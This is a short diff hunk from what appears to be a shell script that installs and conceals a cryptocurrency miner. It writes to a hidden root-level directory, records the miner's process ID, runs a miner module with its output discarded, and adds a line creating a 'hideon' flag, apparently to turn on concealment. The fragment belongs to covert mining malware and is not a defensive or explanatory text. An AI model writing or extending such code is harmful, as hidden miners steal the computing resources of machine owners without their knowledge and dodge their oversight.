@@ -31,6 +31,7 @@ fi
 echo $! > /.__EL_SNEEDIO__/miner.pid
 EOF
 
+touch /.__EL_SNEEDIO__/hideon
 sh /.__EL_SNEEDIO__/modules.d/miner > /dev/null
 
 echo suckies
